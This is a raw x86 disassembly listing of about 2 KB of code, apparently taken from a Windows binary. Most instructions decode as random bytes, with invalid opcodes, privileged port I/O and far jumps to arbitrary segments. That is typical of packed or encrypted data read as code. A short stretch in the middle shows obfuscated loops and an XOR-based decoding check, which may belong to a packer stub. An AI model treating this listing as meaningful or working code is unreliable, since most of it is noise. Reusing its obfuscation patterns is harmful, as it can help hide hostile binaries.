  40c3d2:	mov    esi,0x56e53794
  40c3d7:	loop   0x40c42c
  40c3d9:	dec    ecx
  40c3da:	pop    ds
  40c3db:	inc    edi
  40c3dc:	outs   dx,BYTE PTR ds:[esi]
  40c3dd:	stc    
  40c3de:	jae    0x40c426
  40c3e0:	retf   0x4fcc
  40c3e3:	pop    ss
  40c3e4:	adc    eax,0x79e5eff9
  40c3e9:	mov    al,ds:0x8a8bfad3
  40c3ee:	out    0xef,eax
  40c3f0:	cmp    DWORD PTR [ebp-0x38],eax
  40c3f3:	push   cs
  40c3f4:	mov    BYTE PTR [edi],ch
  40c3f6:	mov    ecx,0x800aa999
  40c3fb:	in     al,dx
  40c3fc:	mov    esp,0x54de849d
  40c401:	ror    BYTE PTR [edi],1
  40c403:	je     0x40c400
  40c405:	test   edx,eax
  40c407:	or     DWORD PTR [ebx+ebx*8+0x3f1e3670],ebx
  40c40e:	jge    0x40c396
  40c410:	pop    ebp
  40c411:	add    esi,DWORD PTR ds:0x2d4de261
  40c417:	adc    dl,BYTE PTR [ebp+0x4f]
  40c41a:	mov    bl,0xac
  40c41c:	adc    DWORD PTR [edi],esi
  40c41e:	adc    eax,DWORD PTR [edi+0x16]
  40c421:	popf   
  40c422:	push   eax
  40c423:	xchg   ebp,eax
  40c424:	push   edx
  40c425:	or     al,0x23
  40c427:	inc    edi
  40c428:	mov    ?,edi
  40c42a:	aad    0x8d
  40c42c:	or     ch,BYTE PTR [ebp+0x26ec2f58]
  40c432:	mov    BYTE PTR [edx+0x33],ah
  40c435:	fwait
  40c436:	push   esp
  40c437:	stos   DWORD PTR es:[edi],eax
  40c438:	jbe    0x40c419
  40c43a:	mov    edx,0x6f6a5b74
  40c43f:	fsub   st,st(5)
  40c441:	dec    ebp
  40c442:	iret   
  40c443:	jge    0x40c414
  40c445:	(bad)  
  40c446:	pmulhw mm3,mm2
  40c449:	les    ecx,FWORD PTR [ebp+0x74]
  40c44c:	dec    ebp
  40c44d:	test   al,0x1b
  40c44f:	or     ecx,edx
  40c451:	jo     0x40c492
  40c453:	int    0x76
  40c455:	retf   0x78b1
  40c458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c459:	arpl   WORD PTR [ebp+0x2e],bp
  40c45c:	scas   al,BYTE PTR es:[edi]
  40c45d:	lahf   
  40c45e:	pop    ebx
  40c45f:	hlt    
  40c460:	xchg   edi,eax
  40c461:	jo     0x40c3f1
  40c463:	nop
  40c464:	ds dec esi
  40c466:	lahf   
  40c467:	or     ebx,ebx
  40c469:	or     eax,DWORD PTR [edx]
  40c46b:	ret    
  40c46c:	mov    esp,eax
  40c46e:	test   eax,0x98a46785
  40c473:	xchg   ebp,eax
  40c474:	sbb    DWORD PTR [ebx+ebx*4+0x5c],ebx
  40c478:	inc    esp
  40c479:	and    ecx,DWORD PTR [edx-0x1d70345b]
  40c47f:	ret    
  40c480:	inc    eax
  40c481:	fisubr DWORD PTR [eax]
  40c483:	push   edi
  40c484:	or     DWORD PTR [ebx-0x479d5115],ebx
  40c48a:	jge    0x40c4a0
  40c48c:	call   0xb5c:0x397d6195
  40c493:	push   es
  40c494:	fsub   DWORD PTR [esi]
  40c496:	xchg   ebx,eax
  40c497:	loope  0x40c491
  40c499:	adc    DWORD PTR [edx-0x7aee8923],0xffffffd0
  40c4a0:	(bad)  
  40c4a2:	jl     0x40c4f4
  40c4a4:	addr16 mov ebx,0xcf7f7ef3
  40c4aa:	or     dh,0xf6
  40c4ad:	int3   
  40c4ae:	push   0x5a
  40c4b0:	xchg   ecx,eax
  40c4b1:	pop    es
  40c4b2:	mov    ds:0x1acbd030,eax
  40c4b7:	adc    eax,ebx
  40c4b9:	cmp    al,BYTE PTR [ebp-0x2]
  40c4bc:	clc    
  40c4bd:	push   ecx
  40c4bf:	jmp    0x40c516
  40c4c1:	mov    bl,0x7f
  40c4c3:	gs sub eax,0x2e8385ea
  40c4c9:	(bad)
  40c4cc:	or     BYTE PTR [edi-0x230f0e81],ch
  40c4d2:	inc    ecx
  40c4d3:	test   al,0x3c
  40c4d5:	jmp    0x40c4cf
  40c4d7:	push   0x57beae21
  40c4dc:	mov    bl,0xd0
  40c4de:	test   eax,0x5cae55cf
  40c4e3:	sar    esi,1
  40c4e5:	add    BYTE PTR fs:[ecx],al
  40c4e8:	dec    edx
  40c4e9:	fstp   TBYTE PTR [ebx-0x59]
  40c4ec:	ud2    
  40c4ee:	test   eax,0xdf8a8a8e
  40c4f3:	or     eax,0x29331dad
  40c4f8:	mov    esp,0x4faabc2b
  40c4fd:	or     esp,DWORD PTR [eax]
  40c4ff:	shr    BYTE PTR [ebp-0x7b],1
  40c502:	cmp    bh,BYTE PTR ds:0xe6d27559
  40c508:	xor    eax,0xdfc957f1
  40c50d:	ds test eax,0x78ed0782
  40c513:	in     al,0x56
  40c515:	test   al,0x93
  40c517:	dec    ecx
  40c518:	imul   edx,DWORD PTR ss:[esi-0x14],0x71
  40c51d:	pop    ds
  40c51e:	xor    DWORD PTR [ebx+ecx*2+0x14],esp
  40c522:	test   esp,esp
  40c524:	into   
  40c525:	mov    bh,0x12
  40c527:	hlt    
  40c528:	and    al,0x41
  40c52a:	jbe    0x40c4d2
  40c52c:	cmp    eax,0xe4b8a750
  40c531:	hlt    
  40c532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c533:	push   edi
  40c534:	retf   0xe8c4
  40c537:	stc    
  40c538:	psllw  mm3,QWORD PTR [eax-0x7016d117]
  40c53f:	shl    cl,cl
  40c541:	mov    si,0xbf5b
  40c545:	out    dx,al
  40c546:	scas   eax,DWORD PTR es:[edi]
  40c547:	outs   dx,DWORD PTR ds:[esi]
  40c548:	push   esp
  40c549:	sub    DWORD PTR [esi],ebx
  40c54b:	call   0x282998b9
  40c550:	lods   eax,DWORD PTR ds:[esi]
  40c551:	fbld   TBYTE PTR [edi+edx*4]
  40c554:	lds    ecx,FWORD PTR [ecx]
  40c556:	dec    eax
  40c557:	xor    DWORD PTR [ecx-0x32],edi
  40c55a:	add    ch,BYTE PTR [esi+0x758fe647]
  40c560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c562:	xor    eax,0x7510855
  40c567:	jmp    0x40c782
  40c56c:	jnp    0x40c5eb
  40c56e:	xchg   edi,eax
  40c56f:	les    edx,FWORD PTR [ecx+0x72c54b52]
  40c575:	sub    esi,DWORD PTR [eax-0xf]
  40c578:	ret    0x9879
  40c57b:	jmp    0x70b14cf1
  40c580:	jb     0x40c601
  40c582:	jo     0x40c5f4
  40c584:	mov    dl,0x7
  40c586:	jae    0x40c5ab
  40c588:	retf   0xd19b
  40c58b:	inc    esi
  40c58c:	scas   eax,DWORD PTR es:[edi]
  40c58d:	push   es
  40c58e:	sub    eax,DWORD PTR [esi-0x79]
  40c591:	fs hlt 
  40c593:	mov    ebp,0x479dbbb3
  40c598:	rcr    DWORD PTR [edi-0x88e6538],0xa7
  40c59f:	fdiv   DWORD PTR [ebp+0x56ab6bf4]
  40c5a5:	cmp    bl,dl
  40c5a7:	cmp    al,0xa9
  40c5a9:	push   esi
  40c5aa:	jo     0x40c58d
  40c5ac:	cmp    DWORD PTR [ecx+ebp*2+0x74ef9099],ecx
  40c5b3:	les    edx,FWORD PTR [edx+0x40976da4]
  40c5b9:	jmp    0x2f6b:0x90e676ec
  40c5c0:	mov    ds:0x7204dc67,eax
  40c5c5:	inc    esi
  40c5c6:	mov    ds:0x153bbf3f,eax
  40c5cb:	xchg   BYTE PTR [ebp-0x5],bh
  40c5ce:	aad    0x44
  40c5d0:	pop    ds
  40c5d1:	pop    ecx
  40c5d2:	jmp    0x40c61a
  40c5d4:	inc    eax
  40c5d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5d6:	cld    
  40c5d7:	test   eax,0x302bcf8c
  40c5dc:	sub    bh,0x17
  40c5df:	jl     0x40c5a5
  40c5e1:	adc    esp,DWORD PTR [ebp+0x281e7b5]
  40c5e7:	sub    eax,0xb7781b96
  40c5ec:	and    al,0x74
  40c5ee:	add    BYTE PTR [edx+0x3002f783],ch
  40c5f4:	mov    ah,bl
  40c5f6:	imul   ecx,DWORD PTR [ebp+0x5d],0xfffffff2
  40c5fa:	jae    0x40c60b
  40c5fc:	loopne 0x40c5eb
  40c5fe:	jecxz  0x40c643
  40c600:	mov    edi,0x84b4d21d
  40c605:	or     al,BYTE PTR [edi+0x3ac84013]
  40c60b:	leave  
  40c60c:	mov    bl,0xe
  40c60e:	adc    esp,ebp
  40c610:	xor    BYTE PTR [edx-0x10],cl
  40c613:	inc    edx
  40c614:	jno    0x40c5e1
  40c616:	pop    ebp
  40c617:	sub    eax,0xc6f02b70
  40c61c:	sub    eax,0xacbcfd03
  40c621:	or     ah,BYTE PTR [ebp+edi*8+0x57]
  40c625:	clc    
  40c626:	push   0xe6f043ed
  40c62b:	xor    bl,BYTE PTR [ebp+0x3d]
  40c62e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c62f:	test   edi,ebp
  40c631:	pop    edi
  40c632:	rcr    DWORD PTR [esi],1
  40c634:	pushf  
  40c635:	pop    ecx
  40c636:	std    
  40c637:	jg     0x40c64d
  40c639:	inc    edx
  40c63a:	push   ss
  40c63b:	cmp    esi,edi
  40c63d:	sti    
  40c63e:	out    0xe0,al
  40c640:	adc    BYTE PTR [esi],ah
  40c642:	cmp    bl,BYTE PTR [eax+0x38d65a84]
  40c648:	add    BYTE PTR [esi-0x5],ch
  40c64b:	mov    al,ds:0x11ba30b5
  40c650:	jecxz  0x40c69d
  40c652:	cmp    BYTE PTR [esi+edi*1-0x55],bl
  40c656:	mov    al,dh
  40c658:	push   edi
  40c659:	int3   
  40c65a:	cmp    DWORD PTR [esi],0x25
  40c65d:	lahf   
  40c65e:	dec    esi
  40c65f:	xchg   DWORD PTR [eax],ebp
  40c661:	push   es
  40c662:	cmp    DWORD PTR [ebp-0x5f32ef26],0xffffffda
  40c669:	test   eax,0x19cdbf11
  40c66e:	xor    bl,dh
  40c670:	cmc    
  40c671:	test   eax,0xbed3c574
  40c676:	cmp    DWORD PTR [eax-0x12747fbe],esi
  40c67c:	lods   al,BYTE PTR ds:[esi]
  40c67d:	cmp    eax,0x49d4a691
  40c682:	pop    ebp
  40c683:	jl     0x40c64f
  40c685:	stos   DWORD PTR es:[edi],eax
  40c686:	jecxz  0x40c674
  40c688:	pop    ds
  40c689:	adc    esp,DWORD PTR [ecx]
  40c68b:	daa    
  40c68c:	daa    
  40c68d:	mov    bl,0x36
  40c68f:	imul   ebx,DWORD PTR [ecx],0x6f4205d7
  40c695:	mov    esi,0x8f368fe3
  40c69a:	pop    ebp
  40c69b:	fistp  DWORD PTR [ebx]
  40c69d:	or     eax,0x5df121c8
  40c6a2:	and    dh,BYTE PTR [ecx+0x5]
  40c6a5:	xlat   BYTE PTR ds:[ebx]
  40c6a6:	sub    bl,ah
  40c6a8:	cmp    cl,BYTE PTR [eax]
  40c6aa:	push   esi
  40c6ab:	inc    edi
  40c6ac:	lock outs dx,DWORD PTR ds:[esi]
  40c6ae:	push   ds
  40c6af:	cmp    ch,ah
  40c6b1:	retf   
  40c6b2:	xchg   ebp,eax
  40c6b3:	or     BYTE PTR [edi-0x77406ea6],bl
  40c6b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6ba:	xchg   ecx,eax
  40c6bb:	enter  0xac40,0xf8
  40c6bf:	sbb    al,0x3d
  40c6c1:	xchg   edx,eax
  40c6c2:	in     eax,dx
  40c6c3:	pop    esi
  40c6c4:	cld    
  40c6c5:	retf   0x67b2
  40c6c8:	mov    eax,0xb04dfdd7
  40c6cd:	jle    0x40c6e6
  40c6cf:	std    
  40c6d0:	inc    ebx
  40c6d1:	and    ch,bh
  40c6d3:	cdq    
  40c6d4:	pushf  
  40c6d5:	cmp    al,0xba
  40c6d7:	jae    0x40c726
  40c6d9:	out    dx,eax
  40c6da:	test   al,0x14
  40c6dc:	push   ss
  40c6dd:	or     DWORD PTR [ebx-0x4f],edx
  40c6e0:	daa    
  40c6e1:	pop    ebp
  40c6e2:	jb     0x40c6f0
  40c6e4:	and    al,0x82
  40c6e7:	and    al,BYTE PTR [edi+0x4b]
  40c6ea:	sub    eax,0xb926e1d7
  40c6ef:	int    0x79
  40c6f1:	cmp    dl,BYTE PTR [ebp-0x29ee0c2f]
  40c6f7:	xor    eax,0x68330107
  40c6fc:	frstor [eax-0x51]
  40c6ff:	jecxz  0x40c69d
  40c701:	mov    al,ds:0x1a893dca
  40c706:	fsub   st,st(0)
  40c708:	fst    st(1)
  40c70a:	add    eax,0xe26c429e
  40c70f:	test   BYTE PTR [edi-0x471ce3a8],bh
  40c715:	outs   dx,DWORD PTR ds:[esi]
  40c716:	pop    eax
  40c717:	mov    bh,0xf6
  40c719:	dec    eax
  40c71a:	sub    esp,DWORD PTR [esi-0x28]
  40c71d:	jns    0x40c70a
  40c71f:	daa    
  40c720:	test   BYTE PTR [eax+0x1c],bh
  40c723:	xchg   edx,eax
  40c724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c725:	sub    BYTE PTR ds:0x8aefd7ae,0x1f
  40c72c:	xor    DWORD PTR [eax+0x2d880776],ebp
  40c732:	repz ret 
  40c734:	adc    DWORD PTR [ecx-0x68],esi
  40c737:	mov    esp,0x5ff76840
  40c73c:	aam    0xdd
  40c73e:	and    al,0xd
  40c740:	jmp    0x40c6c8
  40c742:	and    al,0xe2
  40c744:	shl    BYTE PTR [ebx+0x6c],cl
  40c747:	xchg   DWORD PTR [edx+0x25],edi
  40c74a:	adc    BYTE PTR [eax+eax*1+0x714bd3db],dh
  40c751:	enter  0x8b63,0x3
  40c755:	xor    al,0x86
  40c757:	push   0xb735d9f0
  40c75c:	mov    edx,0x517d63ee
  40c761:	mov    dl,0x1
  40c763:	xchg   DWORD PTR ds:0x3bfa9922,eax
  40c769:	loopne 0x40c7bc
  40c76b:	xor    bl,dl
  40c76d:	ss pop esp
  40c76f:	data16 jge 0x40c796
  40c772:	pop    ecx
  40c773:	retf   
  40c774:	out    dx,eax
  40c775:	pop    ecx
  40c776:	clc    
  40c777:	sbb    ecx,ecx
  40c779:	pop    ebp
  40c77a:	aas    
  40c77b:	loop   0x40c738
  40c77d:	dec    edi
  40c77e:	outs   dx,DWORD PTR ds:[esi]
  40c77f:	mov    al,ds:0x9c05a32c
  40c784:	jb     0x40c7b8
  40c786:	add    cl,cl
  40c788:	ret    0x4
  40c78b:	push   ebp
  40c78c:	mov    ebp,esp
  40c78e:	mov    eax,ds:0x416224
  40c793:	mov    edx,0x32729c
  40c798:	and    DWORD PTR ds:0x434372,edi
  40c79e:	sub    eax,edx
  40c7a0:	and    DWORD PTR ds:0x432700,0x0
  40c7aa:	jmp    0x40c7bc
  40c7af:	mov    ecx,DWORD PTR ds:0x432700
  40c7b5:	inc    ecx
  40c7b6:	mov    DWORD PTR ds:0x432700,ecx
  40c7bc:	cmp    DWORD PTR ds:0x432700,0x1c
  40c7c3:	jae    0x40c8aa
  40c7c9:	cmp    DWORD PTR ds:0x432700,0x21
  40c7d0:	jne    0x40c7e4
  40c7d6:	push   0x432dc2
  40c7db:	push   DWORD PTR [ebp-0x1c]
  40c7de:	call   DWORD PTR ds:0x432d1e
  40c7e4:	jmp    0x40c7af
  40c7e9:	and    DWORD PTR ds:0x434386,0x0
  40c7f3:	jmp    0x40c805
  40c7f8:	mov    ecx,DWORD PTR ds:0x434386
  40c7fe:	inc    ecx
  40c7ff:	mov    DWORD PTR ds:0x434386,ecx
  40c805:	cmp    DWORD PTR ds:0x434386,0x1a
  40c80c:	jae    0x40c8aa
  40c812:	cmp    DWORD PTR ds:0x434386,0x9
  40c819:	jne    0x40c82d
  40c81f:	push   0x43441d
  40c824:	push   DWORD PTR [ebp-0x24]
  40c827:	call   DWORD PTR ds:0x4329ea
  40c82d:	cmp    DWORD PTR ds:0x434386,0x8
  40c834:	jne    0x40c847
  40c83a:	mov    ecx,DWORD PTR ds:0x434386
  40c840:	inc    ecx
  40c841:	mov    DWORD PTR ds:0x434386,ecx
  40c847:	jmp    0x40c7f8
  40c84c:	mov    DWORD PTR ds:0x4343a2,0x1c
  40c856:	cmp    DWORD PTR ds:0x4343a2,0x0
  40c85d:	je     0x40c8aa
  40c863:	cmp    DWORD PTR ds:0x4343a2,0xf
  40c86a:	jne    0x40c87c
  40c870:	push   DWORD PTR [ebp-0x14]
  40c873:	push   DWORD PTR [ebp-0x20]
  40c876:	call   DWORD PTR ds:0x432c66
  40c87c:	cmp    DWORD PTR ds:0x4343a2,0x10
  40c883:	jne    0x40c898
  40c889:	xor    ecx,ecx
  40c88b:	xor    ecx,DWORD PTR ds:0x4343a2
  40c891:	dec    ecx
  40c892:	mov    DWORD PTR ds:0x4343a2,ecx
  40c898:	mov    ecx,DWORD PTR ds:0x4343a2
  40c89e:	dec    ecx
  40c89f:	mov    DWORD PTR ds:0x4343a2,ecx
  40c8a5:	jmp    0x40c856
  40c8aa:	mov    ecx,0x7510855
  40c8af:	push   esi
  40c8b0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8b3:	xor    eax,ecx
  40c8b5:	cmp    eax,esi
  40c8b7:	je     0x40d05a
  40c8bd:	mov    eax,ds:0x41621c
  40c8c2:	mov    esi,DWORD PTR [ebp+0xc]
  40c8c5:	sub    eax,edx
  40c8c7:	xor    eax,ecx
  40c8c9:	jmp    0x40cb3d
  40c8ce:	xchg   edi,eax
  40c8cf:	rol    DWORD PTR ds:0xb5744198,1
  40c8d5:	icebp  
  40c8d6:	lods   al,BYTE PTR ds:[esi]
  40c8d7:	add    al,0x98
  40c8d9:	rol    edi,0xbb
  40c8dc:	cmp    eax,0x708573c8
  40c8e1:	jo     0x40c8ac
  40c8e3:	jle    0x40c955
  40c8e5:	jo     0x40c8d2
  40c8e7:	jmp    0x40c8c9
  40c8e9:	mov    ds:0x47d134d3,eax
  40c8ee:	jp     0x40c8d4
  40c8f0:	(bad)  
  40c8f1:	aam    0x42
  40c8f3:	fdiv   DWORD PTR [ecx+esi*8]
  40c8f6:	data16 sbb al,0x6
  40c8f9:	xchg   edi,eax
  40c8fa:	ja     0x40c8df
  40c8fc:	inc    esi
  40c8fd:	inc    esi
  40c8fe:	xchg   edi,eax
  40c8ff:	je     0x40c893
  40c901:	xchg   ecx,eax
  40c902:	cmp    BYTE PTR [edi+0x5a5e54db],dh
  40c908:	hlt    
  40c909:	jp     0x40c907
  40c90b:	sti    
  40c90c:	stos   DWORD PTR es:[edi],eax
  40c90d:	sub    esp,ebx
  40c90f:	push   ss
  40c910:	and    al,0x96
  40c912:	ret    
  40c913:	out    0x2e,eax
  40c915:	sbb    ebx,DWORD PTR [edx+0x16]
  40c918:	xchg   ecx,eax
  40c919:	test   DWORD PTR [edx+0x73],esp
  40c91c:	mov    dl,0xdc
  40c91e:	and    dl,ah
  40c920:	jmp    0x40c988
  40c922:	dec    edi
  40c923:	jle    0x40c8a7
  40c925:	jg     0x40c938
  40c927:	dec    ebp
  40c928:	je     0x40c90c
  40c92a:	inc    BYTE PTR [edx]
  40c92c:	dec    ecx
  40c92d:	cwde   
  40c92e:	pusha  
  40c92f:	lea    esi,[ebp+ebx*8-0x1caf5751]
  40c936:	sbb    al,0xbf
  40c938:	iret   
  40c939:	les    ecx,FWORD PTR [ebp-0x6a]
  40c93c:	sbb    ah,BYTE PTR [ebp+0x5e]
  40c93f:	jmp    0x2931:0x7e086e89
  40c946:	sub    BYTE PTR [ecx+ebp*4],dh
  40c949:	sti    
  40c94a:	cwde   
  40c94b:	rcl    BYTE PTR [eax+0x67179212],0xac
  40c952:	jno    0x40c8fa
  40c954:	stc    
  40c955:	and    ebp,edx
  40c957:	ja     0x40c8f3
  40c959:	xor    eax,0xd7192aa8
  40c95e:	adc    DWORD PTR [eax+0x52ad32f2],0x2a
  40c965:	ja     0x40c9b1
  40c967:	sub    ebx,DWORD PTR [edi+0x6b]
  40c96a:	lea    edi,ds:0xe3e7748b
  40c970:	dec    eax
  40c971:	adc    al,0xce
  40c973:	js     0x40c98f
  40c975:	nop
  40c976:	lahf   
  40c977:	pop    ds
  40c978:	lahf   
  40c979:	pop    esp
  40c97a:	in     eax,dx
  40c97b:	push   cs
  40c97c:	xor    BYTE PTR [edi-0x55],ah
  40c97f:	mov    ch,BYTE PTR [edi]
  40c981:	push   eax
  40c982:	cdq    
  40c983:	cs leave 
  40c985:	fucomi st,st(5)
  40c987:	mov    edx,DWORD PTR [eax]
  40c989:	outs   dx,BYTE PTR ds:[esi]
  40c98a:	pusha  
  40c98b:	ss pop ebp
  40c98d:	aaa    
  40c98e:	icebp  
  40c98f:	test   BYTE PTR [esi-0x9dad04a],dl
  40c995:	mov    ds:0xb5e8c4b8,eax
  40c99a:	in     eax,dx
  40c99b:	fs jb  0x40ca0c
  40c99e:	adc    DWORD PTR [ebx+0x77],ebx
  40c9a1:	fnstsw WORD PTR [ebp-0x39]
  40c9a4:	arpl   WORD PTR [edx+0x338e3922],ax
  40c9aa:	fldenv [eax]
  40c9ac:	jle    0x40c940
  40c9ae:	ins    DWORD PTR es:[edi],dx
  40c9af:	rol    BYTE PTR [ecx+0x50b1aeb7],0x94
  40c9b6:	int3   
  40c9b7:	xor    eax,0x51541799
  40c9bc:	(bad)  
  40c9bd:	repz mov bl,0x85
  40c9c0:	adc    DWORD PTR [ebx],edi
  40c9c2:	jno    0x40ca0b
  40c9c4:	scas   eax,DWORD PTR es:[edi]
  40c9c5:	pusha  
  40c9c6:	mov    al,ds:0xe79e26a8
  40c9cb:	sahf   
  40c9cc:	nop
  40c9cd:	push   ds
  40c9ce:	push   es
  40c9cf:	inc    edx
  40c9d0:	in     eax,dx
  40c9d1:	inc    esp
  40c9d2:	pop    edi
  40c9d3:	les    ecx,FWORD PTR [ecx]
  40c9d5:	inc    edi
  40c9d6:	mov    ebx,0xc7d6553c
  40c9db:	outs   dx,DWORD PTR ds:[esi]
  40c9dc:	js     0x40c9f2
  40c9de:	or     bh,BYTE PTR [ebx+0x7a]
  40c9e1:	mov    bh,ah
  40c9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9e4:	mov    esp,DWORD PTR [ebp-0x10]
  40c9e7:	sbb    BYTE PTR [eax-0x6d],dh
  40c9ea:	lea    edi,[eax+0xab9faa8]
  40c9f0:	loop   0x40c9b5
  40c9f2:	or     DWORD PTR [ecx-0x2c273b99],ecx
  40c9f8:	ins    BYTE PTR es:[edi],dx
  40c9f9:	call   0x3df692c9
  40c9fe:	mov    esp,0xe2fbdc39
  40ca03:	cli    
  40ca04:	ret    0x85af
  40ca07:	dec    edx
  40ca08:	pop    ebx
  40ca09:	ja     0x40c999
  40ca0b:	sbb    al,bl
  40ca0d:	xchg   BYTE PTR [esi],ah
  40ca0f:	jmp    0xafd7:0x7a619ea
  40ca16:	leave  
  40ca17:	dec    esp
  40ca18:	fsub   st,st(5)
  40ca1a:	xor    ebp,DWORD PTR gs:[ebx-0x6]
  40ca1e:	fcmovnb st,st(2)
  40ca20:	hlt    
  40ca21:	add    eax,0x16dc7ecc
  40ca26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca27:	int3   
  40ca28:	mov    ah,0x2a
  40ca2a:	cwde   
  40ca2b:	push   ecx
  40ca2c:	std    
  40ca2d:	not    BYTE PTR [edx-0xf47c3e7]
  40ca33:	mov    ds:0xe19f06d8,eax
  40ca38:	retf   0x90cb
  40ca3b:	jg     0x40ca28
  40ca3d:	sbb    eax,0x2417e46d
  40ca42:	scas   al,BYTE PTR es:[edi]
  40ca43:	add    DWORD PTR [eax+0x3],eax
  40ca46:	repz repz fldcw WORD PTR cs:[edi]
  40ca4b:	push   ebx
  40ca4c:	xchg   esp,eax
  40ca4d:	mov    cl,0x4f
  40ca4f:	jmp    0x83b1:0x900a0a23
  40ca56:	clc    
  40ca57:	sub    ch,ch
  40ca59:	out    dx,eax
  40ca5a:	or     BYTE PTR [edx],dl
  40ca5c:	xchg   ebx,eax
  40ca5d:	mov    bx,0x3a41
  40ca61:	sub    DWORD PTR [eax-0x23bf19e9],esp
  40ca67:	and    ebp,DWORD PTR [edi-0x4a]
  40ca6a:	pop    es
  40ca6b:	imul   esi,DWORD PTR [edx+0x4ba11774],0xffffff97
  40ca72:	leave  
  40ca73:	mov    esp,0x3aff5630
  40ca78:	bound  eax,QWORD PTR [ebp-0x3deac76a]
  40ca7e:	rcl    BYTE PTR [edx+eiz*8-0x75],0xeb
  40ca83:	bound  esi,QWORD PTR [ebx+eiz*4-0x6dcdcce0]
  40ca8a:	pop    ss
  40ca8b:	fistp  DWORD PTR [eax]
  40ca8d:	mov    ds:0x7d476cd8,al
  40ca92:	mov    BYTE PTR [eax],al
  40ca94:	push   eax
  40ca95:	dec    edi
  40ca96:	jp     0x40ca42
  40ca98:	shl    dl,0x1f
  40ca9b:	test   esi,edi
  40ca9d:	xchg   ebx,eax
  40ca9e:	sub    al,0xfd
  40caa0:	xchg   edi,eax
  40caa1:	dec    eax
  40caa2:	sbb    ebx,eax
  40caa4:	rcr    DWORD PTR [edi],cl
  40caa6:	push   edi
  40caa7:	and    ebx,edx
  40caa9:	cmp    al,0x84
  40caab:	cmp    eax,0x9b3848a0
  40cab0:	mov    al,0x39
  40cab2:	std    
  40cab3:	aas    
  40cab4:	jne    0x40cb19
  40cab6:	xor    DWORD PTR [edi],ebx
  40cab8:	push   es
  40cab9:	punpckhbw mm3,QWORD PTR [edi]
  40cabc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cabd:	xchg   ecx,eax
  40cabe:	xchg   esi,eax
  40cabf:	js     0x40cabb
  40cac1:	jmp    0x40cace
  40cac3:	xchg   edi,eax
  40cac4:	iret   
  40cac5:	xchg   esp,eax
  40cac6:	mov    ds,WORD PTR [edx]
  40cac8:	add    DWORD PTR [ecx-0x6ae9a589],eax
  40cace:	ret    
  40cacf:	push   0x34bdcdb8
  40cad4:	cmp    al,0xbb
  40cad6:	push   0xfffffff5
  40cad8:	and    al,0x84
  40cada:	mov    al,ds:0xf00949f8
  40cadf:	rcr    DWORD PTR [edi+0x53f7799f],1
  40cae5:	nop
  40cae6:	imul   ecx,DWORD PTR ds:0xdf9ca753,0xffffffbb
  40caed:	add    dh,BYTE PTR [ebx]
  40caef:	rol    al,1
  40caf1:	retf   0xf665
  40caf4:	push   esi
  40caf5:	ins    DWORD PTR es:[edi],dx
  40caf6:	stos   BYTE PTR es:[edi],al
  40caf7:	test   al,0xbd
  40caf9:	adc    eax,0x51e1b846
  40cafe:	stos   DWORD PTR es:[edi],eax
  40caff:	pushf  
  40cb00:	xchg   eax,ebp
  40cb02:	in     eax,dx
  40cb03:	cmovns edx,DWORD PTR ds:0x836633ea
  40cb0a:	mov    cl,BYTE PTR [ebx+0x44b1c7d2]
  40cb10:	sub    DWORD PTR [edi+esi*8],edx
  40cb13:	iret   
  40cb14:	jl     0x40cab4
  40cb16:	ins    DWORD PTR es:[edi],dx
  40cb17:	popf   
  40cb18:	fisttp DWORD PTR [ebx+edi*2+0x39469d1d]
  40cb1f:	adc    esp,DWORD PTR [ebp-0x6ca55c26]
  40cb25:	ja     0x40cb81
  40cb27:	pusha  
  40cb28:	sbb    ecx,DWORD PTR [eax+ecx*2+0x48]
  40cb2c:	push   ds
  40cb2d:	addr16 add eax,0x66ab262a
  40cb33:	pushf  
  40cb34:	mov    eax,ds:0x4979906b
  40cb39:	sbb    eax,0x3b6784ed
  40cb3e:	(bad)  
  40cb3f:	jne    0x40cb55
  40cb45:	mov    eax,ds:0x416224
  40cb4a:	add    eax,DWORD PTR ds:0x41621c
  40cb50:	jmp    0x40d044
  40cb55:	mov    eax,DWORD PTR [ebp+0xc]
  40cb58:	xor    eax,ecx
  40cb5a:	jmp    0x40cdce
  40cb5f:	pop    ecx
  40cb60:	scas   al,BYTE PTR es:[edi]
  40cb61:	sbb    BYTE PTR [ebx-0xd],al
  40cb64:	push   ecx
  40cb65:	pop    ecx
  40cb66:	mov    dh,0xd4
  40cb68:	(bad)
  40cb6b:	mov    WORD PTR [ecx],?
  40cb6d:	nop
  40cb6e:	inc    esi
  40cb6f:	int3   
  40cb70:	xor    BYTE PTR [eax+0x70],0xc9
  40cb74:	jle    0x40cbe6
  40cb76:	jo     0x40cb1a
  40cb78:	mov    cl,0x20
  40cb7a:	or     eax,0xa7ae2ea8
  40cb7f:	inc    esp
  40cb80:	cmp    ch,BYTE PTR ds:[edi-0x66]
  40cb84:	repz adc BYTE PTR [eax+0x16d09c2f],ah
  40cb8b:	mov    bl,0x60
  40cb8d:	adc    al,0xd4
  40cb8f:	ret    0x277a
  40cb92:	jle    0x40cbe9
  40cb94:	push   edx
  40cb95:	aaa    
  40cb96:	mov    ebx,0x9e9c3903
  40cb9b:	xor    BYTE PTR [ebp+eiz*8-0x11],dh
  40cb9f:	xor    esp,DWORD PTR [edi]
  40cba1:	nop
  40cba2:	int    0xd6
  40cba4:	xor    BYTE PTR [ebp+0x73],bh
  40cba7:	and    eax,0x5dbdb774
  40cbac:	sub    BYTE PTR [ebp+0x5e],cl
  40cbaf:	push   eax
  40cbb0:	fcom   st(7)
  40cbb2:	pusha  
  40cbb3:	add    eax,0xede82daf
  40cbb8:	retf   0x51ef
  40cbbb:	and    eax,eax
  40cbbd:	mov    ch,0x63
  40cbbf:	sbb    al,BYTE PTR [edi-0x61]
  40cbc2:	pop    ds
  40cbc3:	push   edx
  40cbc4:	jne    0x40cbdc
  40cbc6:	(bad)  
  40cbc8:	jbe    0x40cc25
